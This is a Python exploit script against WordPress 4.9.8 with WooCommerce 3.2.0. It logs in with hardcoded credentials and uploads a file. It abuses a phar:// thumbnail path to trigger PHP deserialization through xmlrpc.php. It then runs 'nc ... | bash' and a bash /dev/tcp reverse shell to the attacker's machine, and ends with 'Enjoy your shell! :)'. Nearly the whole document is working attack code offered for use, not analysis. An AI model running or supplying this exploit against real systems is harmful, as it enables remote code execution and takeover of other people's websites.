#!/usr/bin/env python3

#This exploit needs wordpress 4.9.8 with woocommerce 3.2.0 installed
import requests
import subprocess
import time
from base64 import b64encode

targetIP = '192.168.56.102'
localIP = '192.168.56.1'
log = 'admin'
pw = '123456789'
command = 'nc ' + localIP + ' 1234 | bash'

#login post request
wp_submit = 'Anmelden'
redirect_to = 'http://' + targetIP + '/wordpress/wp-admin/'
payload = { 
    'log': log,
    'pwd': pw,
    'wp_submit': wp_submit,
    'redirect_to': redirect_to
}

#start php rpc script to upload malicious file
proc = subprocess.Popen("php rpc_upload.php " + targetIP + " " + log + " " + pw , shell=True, stdout=subprocess.PIPE)
script_response = str(proc.stdout.read())

#get thumbnail id from response
script_response = script_response.split('attachment_id&lt;/name&gt;&lt;value&gt;&lt;string&gt;')[1]
thumb_id = script_response.split('&lt;/string&gt;&lt;/value&gt;&lt;')[0]

#prepare urls
login_url = 'http://' + targetIP + '/wordpress/wp-login.php'
edit_url = 'http://' + targetIP + '/wordpress/wp-admin/post.php?post=' + thumb_id + '&action=edit'
post_url = 'http://' + targetIP + '/wordpress/wp-admin/post.php'
profile_url = 'http://' + targetIP + '/wordpress/wp-admin/profile.php'
xmlURL = 'http://' + targetIP + '/wordpress/xmlrpc.php'
exploitURL = xmlURL + '?c=' + command

with requests.Session() as s:
    #login
    p = s.post(login_url, data=payload)

    #get _wp_nonce
    p = s.get(edit_url)
    nonce = p.text.split('_wpnonce" value="')[1]
    nonce = nonce.split('"')[0]
    
    #get path of the file
    path = p.text.split('\n')[0]
    path = path.split('wp-content')
    path = 'wp-content' + path[1]

    #get userID
    p = s.get(profile_url)
    userID = p.text.split('user_id" value="')[1]
    userID = int(userID.split('"')[0])

    #make request to change the file name to a windows path
    post_request = {
        '_wpnonce': nonce,
        '_wp_http_referer': '%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D'+ thumb_id + '%26action%3Dedit',
        'user_ID': userID,
        'action': 'editpost',
        'originalaction': 'editpost',
        'post_author': userID,
        'post_type': 'attachment',
        'original_post_status': 'inherit',
        'referredby': 'http%3A%2F%2F'+ targetIP + '%2Fwordpress%2Fwp-admin%2Fupload.php',
        '_wp_original_http_referer': 'http%3A%2F%2F' + targetIP + '%2Fwordpress%2Fwp-admin%2Fupload.php',
        'post_ID': thumb_id,
        'file': 'Z:\Z'
    }
    p = s.post(post_url, data=post_request)

    #Attach our test.txt inside the archive file to the file as a thumbnail
    #this fools file_exists() into deserializing our phar archive
    post_request = {
        '_wpnonce': nonce,
        '_wp_http_referer': '%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D' + thumb_id + '%26action%3Dedit',
        'user_ID': userID,
        'action': 'editattachment',
        'originalaction': 'editattachment',
        'thumb':  'phar://./' + path + '/test.txt',
        'post_ID': thumb_id 
    }
    p = s.post(post_url, data=post_request)


#send exploit trigger RPC and redirect shell to localIP on port 1235
#to receive a shell execute 'nc -l 1235' in another terminal
nc = subprocess.Popen('nc -l 1234', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
time.sleep(0.05)

#Trigger RPC see rpc_trigger.php
xmlRPCTrigger = """<?xml version="1.0"?>
<methodCall>
<methodName>wp.getMediaItem</methodName>
<params>
<param><value><int>1</int></value></param>"""
xmlRPCTrigger += "<param><value><string>" + log + "</string></value></param>"
xmlRPCTrigger += "<param><value><string>" + pw + "</string></value></param>"
xmlRPCTrigger += "<param><value><string>" + thumb_id + "</string></value></param>"
xmlRPCTrigger += "</params></methodCall>"

#If exploit successful no response is returned,a bit janky but works most of the time
try:
    p = requests.post(exploitURL, data=xmlRPCTrigger, timeout=0.1)
    print('Request is suposed to time out, got response: ')
    print(p.text)
except requests.ReadTimeout:
    pass

#start an interactive shell over TCP to localIP on port 1235 and redirect output
time.sleep(0.05)
nc.stdin.write(str.encode('bash -i >& /dev/tcp/' + localIP + '/1235 0>&1'))

print('Enjoy your shell! :)')
